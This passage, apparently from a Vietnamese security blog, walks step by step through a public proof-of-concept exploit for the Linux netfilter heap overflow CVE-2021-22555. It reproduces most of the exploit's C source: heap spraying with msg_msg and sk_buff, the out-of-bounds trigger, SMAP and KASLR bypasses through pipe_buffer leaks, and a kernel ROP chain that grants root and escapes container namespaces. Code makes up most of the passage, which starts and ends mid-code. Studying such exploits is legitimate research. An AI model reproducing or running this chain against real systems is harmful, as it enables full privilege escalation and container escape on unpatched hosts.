dựng: 1 2 3 4 struct { long mtype; char mtext[PRIMARY_SIZE - MSG_MSG_SIZE]; } msg_primary; với MSG_MSG_SIZE là kích thước của cấu trúc msg_msg:\n1 2 3 4 5 6 7 8 9 10 #define MSG_MSG_SIZE (sizeof(struct msg_msg)) struct msg_msg { uint64_t m_list_next; uint64_t m_list_prev; uint64_t m_type; uint64_t m_ts; uint64_t next; uint64_t security; }; Hàm write_msg: 1 2 3 4 5 6 7 8 int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) { *(long *)msgp = msgtyp; if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) \u0026lt; 0) { perror(\u0026#34;[-] msgsnd\u0026#34;); return -1; } return 0; } Hàm này gọi msgsnd để gửi những message có kích thước là 4096. Cấu trúc msg_primary bắt nguồn từ lệnh này\nTham số thứ ba được truyền là msgsz - sizeof(long) vì tham số này lấy kích thước của phần mtext, nên chúng ta lấy kích thước của cả cấu trúc msg_primary trừ cho kích thước của mtype.\nĐể hiểu chi tiết hơn, bạn có thể đọc ở đây .\ndòng 6-7 dùng với mục đích kiểm tra double reference ở các bước sau. Spraying second messages 1 2 3 4 5 6 7 8 9 printf(\u0026#34;[*] Spraying secondary messages...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { memset(\u0026amp;msg_secondary, 0, sizeof(msg_secondary)); *(int *)\u0026amp;msg_secondary.mtext[0] = MSG_TAG; *(int *)\u0026amp;msg_secondary.mtext[4] = i; if (write_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) \u0026lt; 0) goto err_rmid; } Tạo secondary message tương tự với tạo primary messages, chỉ khác là kích thước của msg_secondary lúc này là 1024 thay vì 4096, do đó, cấu trúc của msg_secondary sẽ là: 1 2 3 4 struct { long mtype; char mtext[SECONDARY_SIZE - MSG_MSG_SIZE]; } msg_secondary; Với SECONDARY_SIZE = 1024.\nCreating holes in primary messages 1 2 3 4 5 6 printf(\u0026#34;[*] Creating holes in primary messages...\\n\u0026#34;); for (int i = HOLE_STEP; i \u0026lt; NUM_MSQIDS; i += HOLE_STEP) { if (read_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt; 0) goto err_rmid; } Dùng vòng for để giải phóng các primary message với HOLE_STEP = 1024 và NUM_MSQIDS = 4096. Hàm read_msg được định nghĩa như sau: 1 2 3 4 5 6 7 int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) { if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) \u0026lt; 0) { perror(\u0026#34;[-] msgrcv\u0026#34;); return -1; } return 0; } Dễ thấy, read_msg và write_msg là một cặp hàm gọi tương ứng các lệnh msgsnd và msgrcv để gửi và nhận các messages. Với msgrcv, sau khi nhận xong, nó sẽ giải phóng vùng nhớ được nhận, do đó, nó sẽ tạo ra các lỗ hổng có kích thước bằng 1024 trong các primary message.\nTriggering out-of-bounds write\u0026hellip; 1 2 3 printf(\u0026#34;[*] Triggering out-of-bounds write...\\n\u0026#34;); if (trigger_oob_write(s) \u0026lt; 0) goto err_rmid; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 int trigger_oob_write(int s) { struct __attribute__((__packed__)) { struct ipt_replace replace; struct ipt_entry entry; struct xt_entry_match match; char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2]; struct xt_entry_target target; } data = {0}; data.replace.num_counters = 1; data.replace.num_entries = 1; data.replace.size = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad) + sizeof(data.target)); data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad) + sizeof(data.target)); data.entry.target_offset = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad)); data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad)); strcpy(data.match.u.user.name, \u0026#34;icmp\u0026#34;); data.match.u.user.revision = 0; data.target.u.user.target_size = sizeof(data.target); strcpy(data.target.u.user.name, \u0026#34;NFQUEUE\u0026#34;); data.target.u.user.revision = 1; // Partially overwrite the adjacent buffer with 2 bytes of zero. if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, \u0026amp;data, sizeof(data)) != 0) { if (errno == ENOPROTOOPT) { printf(\u0026#34;[-] Error ip_tables module is not loaded.\\n\u0026#34;); return -1; } } return 0; } Hàm trigger_oob_write mục đích là kích hoạt lỗi heap out-of-bound được để cập ở trên. Hàm setsockopt được gọi là dòng 29 có optname là IPT_SO_SET_REPLACE kết hợp với tùy chọn CAP_NET_ADMIN khi tạo docker sẽ kích hoạt hàm xt_compat_target_from_user() - hàm chứa lỗi heap-out-of-bound. Dòng 25 tác giả sử dụng cấu trúc NFQUEUE để kiểm soát giá trị của target-\u0026gt;targetsize. Về cấu trúc của data, tôi vẫn chưa thực sự hiểu. Ở đây, tác giả dùng khai báo struct __attribute__((__packed__)) để cho phép cấu trúc của data có kích thước nhỏ hơn bằng bằng kích thước align (memory alignment); các cấu trúc ipt_* là các cấu trúc được sử dụng trong netfilter và có mối quan hệ như hình bên:\n. Searching for corrupted primary message 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 printf(\u0026#34;[*] Searching for corrupted primary message...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { if (i != 0 \u0026amp;\u0026amp; (i % HOLE_STEP) == 0) continue; if (peek_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), 1) \u0026lt; 0) goto err_no_rmid; if (*(int *)\u0026amp;msg_secondary.mtext[0] != MSG_TAG) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } if (*(int *)\u0026amp;msg_secondary.mtext[4] != i) { fake_idx = i; real_idx = *(int *)\u0026amp;msg_secondary.mtext[4]; break; } } if (fake_idx == -1 \u0026amp;\u0026amp; real_idx == -1) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } // fake_idx\u0026#39;s primary message has a corrupted next pointer; wrongly // pointing to real_idx\u0026#39;s secondary message. printf(\u0026#34;[+] fake_idx: %x\\n\u0026#34;, fake_idx); printf(\u0026#34;[+] real_idx: %x\\n\u0026#34;, real_idx); Dùng vòng for từ dòng 2-10 để kiểm tra tất cả các message đã được cấp phát Hàm peek_msg() để đọc giá trị của các message và lưu vào msg_secondary, được định nghĩa như sau: 1 2 3 4 5 6 7 8 int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) { if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) \u0026lt; 0) { perror(\u0026#34;[-] msgrcv\u0026#34;); return -1; } return 0; } Khá giống với hàm read_msg đều gọi hàm msgrcv, điểm khác biệt duy nhất là msgflg có giá trị là MSG_COPY | IPC_NOWAIT\nDòng 11-15 , dùng giá trị của msg_secondary.mtext[4] để kiểm tra xem liệu có xuất hiện trường hợp 2 cấu trúc cùng tham khảo đến một địa chỉ hay không. Ở bước khởi tạo, chúng ta gán mỗi giá trị msg_secondary.mtext[4] là một giá trị chỉ số i tương ứng, trong bước này, nếu tồn tại một message có msg_secondary.mtext[4] khác với chỉ số tương ứng của nó, điều đó có nghĩa message này đang trỏ tới một cấu trúc khác trên primary_message. STAGE 2: SMAP bypass Freeing real secondary message\u0026hellip; 1 2 3 4 printf(\u0026#34;[*] Freeing real secondary message...\\n\u0026#34;); if (read_msg(msqid[real_idx], \u0026amp;msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) \u0026lt; 0) goto err_rmid; Giống như những stage trước, để giải phóng các messages đã được cấp phát, ta dùng lệnh read_msg để đọc message rồi giải phóng vùng nhớ đó.\nSpraying fake secondary messages\u0026hellip; 1 2 3 4 5 memset(secondary_buf, 0, sizeof(secondary_buf)); build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242, PAGE_SIZE - MSG_MSG_SIZE, 0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; Sau khi đã giải phóng message gốc, chúng ta tạo ra một fake secondary message thông qua hàm build_msg_msg: 1 2 3 4 5 6 7 8 9 void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, uint64_t m_ts, uint64_t next) { msg-\u0026gt;m_list_next = m_list_next; msg-\u0026gt;m_list_prev = m_list_prev; msg-\u0026gt;m_type = MTYPE_FAKE; msg-\u0026gt;m_ts = m_ts; msg-\u0026gt;next = next; msg-\u0026gt;security = 0; } Tiến hành spray cấu trúc skbuff bằng lệnh skbuff: 1 2 3 4 5 6 7 8 9 10 11 int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) { for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { for (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) { if (write(ss[i][0], buf, size) \u0026lt; 0) { perror(\u0026#34;[-] write\u0026#34;); return -1; } } } return 0; } skbuff là một nguyên liệu tuyệt vời để tạo UAF, thao tác này làm cho cấu trúc skbuf trỏ tới fake message của chúng ta. Khi chúng ta giải phóng fake message, cấu trúc sk_buff vẫn còn và trỏ tới vị trí fake_message của mình.\nĐể thực hiện spray, ta dùng hai vòng for, vòng thứ nhất đi qua tất cả các cặp SOCKETS được khởi tạo, vòng thứ 2 đi qua tất cả các cấu trúc sk_buff đang có trên mỗi cặp socket rồi dùng lệnh write để cấp phát và ghi nội dung fake secondary message của chúng ta.\nLeaking adjacent secondary message 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Use the fake secondary message to read out-of-bounds. printf(\u0026#34;[*] Leaking adjacent secondary message...\\n\u0026#34;); if (peek_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), 1) \u0026lt; 0) goto err_rmid; // Check if the leak is valid. if (*(int *)\u0026amp;msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) { printf(\u0026#34;[-] Error could not leak adjacent secondary message.\\n\u0026#34;); goto err_rmid; } // The secondary message contains a pointer to the primary message. msg = (struct msg_msg *)\u0026amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE]; kheap_addr = msg-\u0026gt;m_list_next; if (kheap_addr \u0026amp; (PRIMARY_SIZE - 1)) kheap_addr = msg-\u0026gt;m_list_prev; printf(\u0026#34;[+] kheap_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kheap_addr); if ((kheap_addr \u0026amp; 0xFFFF000000000000) != 0xFFFF000000000000) { printf(\u0026#34;[-] Error kernel heap address is incorrect.\\n\u0026#34;); goto err_rmid; } Sau khi spray để cấu trúc sk_buff trỏ đến fake message, ta cần leak địa chỉ của secondary message kế tiếp. Ta cần địa chỉ này để có thể giải phóng vùng nhớ tại đó. Với cấu trúc của msg_fake là: 1 2 3 4 struct { long mtype; char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE]; } msg_fake; Ở đây, mtext được cấp phát với kích thước là PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE,\n1 2 3 4 #define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg)) struct msg_msgseg { uint64_t next; }; Dùng hàm peek_msg để lấy fake_message tại index fake_idx, lưu vào msg_fake. Câu lệnh ở dòng 7 để đám bảo rằng message chúng ta lấy ra là fake_message. Vì tất cả các message gốc, khi khởi tạo đều gán giá trị tại msg/mtext[SECONDARY_SIZE] = MSG_TAG. Trong cấu trúc struct msg_msg có một trường là m_ts được sử dụng để xác định kích thước dữ liệu trả lại cho user với kích thước gốc là 1024-sizeof(struct msg_msg). Tuy nhiên, chúng ta đã cấp phát với PAGESIZE = 4096 do đó, kích thước này có giá trị là 4096 - sizeof(struct msg_msg). Chính điều này cho phép chúng ta đọc được giá trị của cấu trúc liền kề.\nDo đó, tại dòng 13 lấy địa chỉ của cấu trúc msg_msg tiếp theo từ msg_fake. Sau đó, lấy địa chỉ của trường m_list_next và lưu vào kheap_addr. Vì kheap_addr là nơi bắt đầu của các primary message nên nó sẽ là bội của PRIMARY_SIZE, phép toán kheap_addr \u0026amp; (PRIMARY_SIZE - 1) ở dòng 15 tương đương với kheap_addr mod PRIMARY_SIZE để kiểm tra xem m_list_next có phải là địa chỉ của message kế tiếp không, nếu không phải thì nó sẽ được gán giá trị m_list_prev. Câu lệnh if ở dòng 19-22 để kiểm tra xem địa chỉ của chúng ta có hợp lệ không. Freeing fake secondary messages\u0026hellip; 1 2 printf(\u0026#34;[*] Freeing fake secondary messages...\\n\u0026#34;); free_skbuff(ss, secondary_buf, sizeof(secondary_buf)); 1 2 3 4 5 6 7 8 9 10 11 int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) { for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { for (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) { if (read(ss[i][1], buf, size) \u0026lt; 0) { perror(\u0026#34;[-] read\u0026#34;); return -1; } } } return 0; } Bước tiếp theo giải phóng vùng nhớ fake_secondary messages. Tương tự như hàm spray_skbuff, hàm free_skbuff dùng 2 vòng for để đi qua tất cả các cặp sockets và tất cả các cấu trúc sk_buff trên từng cặp socker để đọc dữ liệu từ vùng nhớ đã được ghi vào ss bằng lệnh read. Lệnh read sau đi đọc xong sẽ tiến hành giải phòng vùng nhớ này Và đừng quên, cấu trúc sk_buff trỏ vào vùng nhớ vừa được giải phóng vẫn còn tồn tại.\nSpraying fake secondary messages\u0026hellip; 1 2 3 4 5 6 7 8 // Put kheap_addr at next to leak its content. Assumes zero bytes before // kheap_addr. printf(\u0026#34;[*] Spraying fake secondary messages...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242, sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; Chúng ta xây dựng lại một fake secondary message, nhưng lần này, chúng ta xây dựng với msg-\u0026gt;next = kheap_addr - MSG_MSGSEG_SIZE, với kheap_addr là địa chỉ được leak từ step trước. Ta tiến hành spray bằng lệnh spray_skbuff. Leaking primary message\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // Use the fake secondary message to read from kheap_addr. printf(\u0026#34;[*] Leaking primary message...\\n\u0026#34;); if (peek_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), 1) \u0026lt; 0) goto err_rmid; // Check if the leak is valid. if (*(int *)\u0026amp;msg_fake.mtext[PAGE_SIZE] != MSG_TAG) { printf(\u0026#34;[-] Error could not leak primary message.\\n\u0026#34;); goto err_rmid; } // The primary message contains a pointer to the secondary message. msg = (struct msg_msg *)\u0026amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE]; kheap_addr = msg-\u0026gt;m_list_next; if (kheap_addr \u0026amp; (SECONDARY_SIZE - 1)) kheap_addr = msg-\u0026gt;m_list_prev; // Calculate the address of the fake secondary message. kheap_addr -= SECONDARY_SIZE; printf(\u0026#34;[+] kheap_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kheap_addr); if ((kheap_addr \u0026amp; 0xFFFF00000000FFFF) != 0xFFFF000000000000) { printf(\u0026#34;[-] Error kernel heap address is incorrect.\\n\u0026#34;); goto err_rmid; Bước này căn bản giống với thao tác lấy địa chỉ của primary message truocs đó, điểm khác suy nhất là chúng ta cấu trúc msg_msg được lấy ra từ địa chỉ PAGE_SIZE-MSG_MSG_SIZE STAGE 3: KASLR bypass Freeing fake secondary messages\u0026hellip; Bước này đơn gian gọi lại hàm free_skbuff để giải phóng vùng nhớ của fake secondary messages.\n1 2 printf(\u0026#34;[*] Freeing fake secondary messages...\\n\u0026#34;); free_skbuff(ss, secondary_buf, sizeof(secondary_buf)); Spraying fake secondary messages\u0026hellip; 1 2 3 4 5 6 // Put kheap_addr at m_list_next \u0026amp; m_list_prev so that list_del() is possible. printf(\u0026#34;[*] Spraying fake secondary messages...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; Chúng ta xây dựng cấu trúc msg_msg mới mà ở đó, m_list_next và m_list_prev cùng trỏ về 1 địa chỉ là kheap_buff\nFreeing sk_buff data buffer\u0026hellip; 1 2 3 printf(\u0026#34;[*] Freeing sk_buff data buffer...\\n\u0026#34;); if (read_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), MTYPE_FAKE) \u0026lt; 0) goto err_rmid; Giải phóng vùng nhớ mà sk_buff trỏ tới bằng lệnh read_msg\nSpraying pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 printf(\u0026#34;[*] Spraying pipe_buffer objects...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) { if (pipe(pipefd[i]) \u0026lt; 0) { perror(\u0026#34;[-] pipe\u0026#34;); goto err_rmid; } // Write something to populate pipe_buffer. if (write(pipefd[i][1], \u0026#34;pwn\u0026#34;, 3) \u0026lt; 0) { perror(\u0026#34;[-] write\u0026#34;); goto err_rmid; } } Khi pipe được gọi, nó sẽ gọi hàm alloc_pipe_info() để cấp phát các vùng nhớ với cấu trúc là struct pipe_buffer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/pipe.c struct pipe_inode_info *alloc_pipe_info(void) { ... unsigned long pipe_bufs = PIPE_DEF_BUFFERS; ... pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT); if (pipe == NULL) goto out_free_uid; ... pipe-\u0026gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT); ... } và cấu trúc của struct pipe_buffer:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/pipe_fs_i.h struct pipe_buffer { struct page *page; unsigned int offset, len; const struct pipe_buf_operations *ops; unsigned int flags; unsigned long private; }; struct pipe_buf_operations { ... /* * When the contents of this pipe buffer has been completely * consumed by a reader, -\u0026gt;release() is called. */ void (*release)(struct pipe_inode_info *, struct pipe_buffer *); ... }; chứa con trỏ trỏ tới pipe_buf_operation. Mặt khác, khi được cấp phát, ops sẽ trỏ tới một static struct anon_pipe_buf_ops. Cấu trúc này nằm trong vùng .data:\n1 2 3 4 5 6 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/pipe.c static const struct pipe_buf_operations anon_pipe_buf_ops = { .release = anon_pipe_buf_release, .try_steal = anon_pipe_buf_try_steal, .get = generic_pipe_buf_get, }; Vì khoảng cách từ .data với .text luôn không đổi, nên từ địa chỉ anon_pipe_buf_ops chúng ta có thể tính kernel base address. Vì vậy, chúng ta spray để cấp phát các cấu trúc pipe_buffer với mục tiêu 1 cấu trúc sẽ nằm ngay vị trí được struct sk_buff trỏ tới vừa được giải phóng ở bước trước.\nLeaking and freeing pipe_buffer object\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 printf(\u0026#34;[*] Leaking and freeing pipe_buffer object...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { for (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) { if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) { perror(\u0026#34;[-] read\u0026#34;); goto err_rmid; } if (*(uint64_t *)\u0026amp;secondary_buf[0x10] != MTYPE_FAKE) pipe_buffer_ops = *(uint64_t *)\u0026amp;secondary_buf[0x10]; } } kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS; printf(\u0026#34;[+] anon_pipe_buf_ops: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, pipe_buffer_ops); printf(\u0026#34;[+] kbase_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kbase_addr); if ((kbase_addr \u0026amp; 0xFFFF0000000FFFFF) != 0xFFFF000000000000) { printf(\u0026#34;[-] Error kernel base address is incorrect.\\n\u0026#34;); goto err_rmid; } Chúng ta dùng 2 vòng for để đi qua tất cả các vùng nhớ mà sk_buff trỏ tới, tại đây, ta đọc dữ liệu, lưu vào vùng đệm secondary_buf tại dòng 4. Tại dòng số 8 kiểm tra để xác tìm vùng nhớ mà chúng ta muốn. MTYPE_FAKE là giá trị được gán cho msg-\u0026gt;mtype khi chúng ta tạo fake_msg_msg từ hàm build_msg_msg. Do đó, vùng nhớ nào có giá trị tại secondary_buf[0x10] khác với MTYPE_FAKE chính là vùng nhớ chúng của pipe_buffer mà chúng ta spray được. Ta lấy địa chỉ của vùng nhớ này tại dòng 9 và lưu vào biến pipe_buffer_ops kbase_addr được tín từ công thức ở dòng 13, trong đó: Để tính ANON_PIPE_BUF_OPS ta tính lấy địa chỉ anon_pipe_buf_ops và _text trong file /proc/kallsyms:\n1 2 3 4 5 root@ubuntu:/home/edisc/Desktop/cve-2021-22555/security-research/pocs/linux/cve-2021-22555# cat /proc/kallsyms | grep anon_pipe_buf_ops ffffffff9c878380 r anon_pipe_buf_ops root@ubuntu:/home/edisc/Desktop/cve-2021-22555/security-research/pocs/linux/cve-2021-22555# cat /proc/kallsyms | grep _text ffffffff9b800000 T _text ANON_PIPE_BUF_OPS = anon_pipe_buf_ops - _text STAGE 4: Kernel code execution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 printf(\u0026#34;[+] STAGE 4: Kernel code execution\\n\u0026#34;); printf(\u0026#34;[*] Spraying fake pipe_buffer objects...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); buf = (struct pipe_buffer *)\u0026amp;secondary_buf; buf-\u0026gt;ops = kheap_addr + 0x290; ops = (struct pipe_buf_operations *)\u0026amp;secondary_buf[0x290]; #ifdef KERNEL_COS_5_4_89 // RAX points to \u0026amp;buf-\u0026gt;ops. // RCX points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX; #elif KERNEL_UBUNTU_5_8_0_48 // RSI points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39; #endif build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; // Trigger pipe_release(). printf(\u0026#34;[*] Releasing pipe_buffer objects...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) { if (close(pipefd[i][0]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } if (close(pipefd[i][1]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } } printf(\u0026#34;[*] Checking for root...\\n\u0026#34;); if ((fd = open(\u0026#34;/etc/shadow\u0026#34;, O_RDONLY)) \u0026lt; 0) { printf(\u0026#34;[-] Error could not gain root privileges.\\n\u0026#34;); goto err_rmid; } close(fd); printf(\u0026#34;[+] Root privileges gained.\\n\u0026#34;); Spraying fake pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 printf(\u0026#34;[*] Spraying fake pipe_buffer objects...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); buf = (struct pipe_buffer *)\u0026amp;secondary_buf; buf-\u0026gt;ops = kheap_addr + 0x290; ops = (struct pipe_buf_operations *)\u0026amp;secondary_buf[0x290]; #ifdef KERNEL_COS_5_4_89 // RAX points to \u0026amp;buf-\u0026gt;ops. // RCX points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX; #elif KERNEL_UBUNTU_5_8_0_48 // RSI points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39; #endif build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; Chúng ta tạo một fake pipe_buffer objects với kheap_addr + 0x290. Tiếp theo, dòng 6-9 dùng cho centos 5.4.89 và dòng 10-13 cho ubuntu 5.8.0.48 Xây dựng một kernel rop lưu vào secondary_buf và dùng lệnh spray_skbuff để đưa kernel_rop của chúng ta vào vùng nhớ để thực thi. Hàm build_krop được xây dựng như sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 // Note: Must not touch offset 0x10-0x18. void build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr) { uint64_t *rop; #ifdef KERNEL_COS_5_4_89 *(uint64_t *)\u0026amp;buf[0x00] = kbase_addr + POP_RSP_POP_RBX_RET; rop = (uint64_t *)\u0026amp;buf[0x18]; // Save RBP at scratchpad_addr. *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R14_POP_RBP_RET; *rop++ = scratchpad_addr; // R14 *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_QWORD_PTR_R14_RBX_POP_RBX_POP_R14_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBX *rop++ = 0xDEADBEEF; // R14 *rop++ = 0xDEADBEEF; // RBP // commit_creds(prepare_kernel_cred(NULL)) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 0; // RDI *rop++ = kbase_addr + PREPARE_KERNEL_CRED; *rop++ = kbase_addr + POP_RDX_RET; *rop++ = 1; // RDX *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + COMMIT_CREDS; // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 1; // RDI *rop++ = kbase_addr + FIND_TASK_BY_VPID; *rop++ = kbase_addr + POP_RDX_RET; *rop++ = 1; // RDX *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + POP_RSI_RET; *rop++ = kbase_addr + INIT_NSPROXY; // RSI *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES; // Load RBP from scratchpad_addr and resume execution. *rop++ = kbase_addr + POP_RBP_RET; *rop++ = scratchpad_addr - 0x25; // RBP *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_25_POP_RBP_RET; *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET; #elif KERNEL_UBUNTU_5_8_0_48 *(uint64_t *)\u0026amp;buf[0x39] = kbase_addr + POP_RSP_RET; *(uint64_t *)\u0026amp;buf[0x00] = kbase_addr + ADD_RSP_D0_RET; rop = (uint64_t *)\u0026amp;buf[0xD8]; // Save RBP at scratchpad_addr. *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET; *rop++ = scratchpad_addr; // R12 *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBX *rop++ = 0xDEADBEEF; // R12 *rop++ = 0xDEADBEEF; // RBP // commit_creds(prepare_kernel_cred(NULL)) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 0; // RDI *rop++ = kbase_addr + PREPARE_KERNEL_CRED; *rop++ = kbase_addr + POP_RCX_RET; *rop++ = 4; // RCX *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET; *rop++ = kbase_addr + COMMIT_CREDS; // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 1; // RDI *rop++ = kbase_addr + FIND_TASK_BY_VPID; *rop++ = kbase_addr + POP_RCX_RET; *rop++ = 4; // RCX *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET; *rop++ = kbase_addr + POP_RSI_RET; *rop++ = kbase_addr + INIT_NSPROXY; // RSI *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES; // Load RBP from scratchpad_addr and resume execution. *rop++ = kbase_addr + POP_RBP_RET; *rop++ = scratchpad_addr - 0xA; // RBP *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET; *rop++ = kbase_addr + 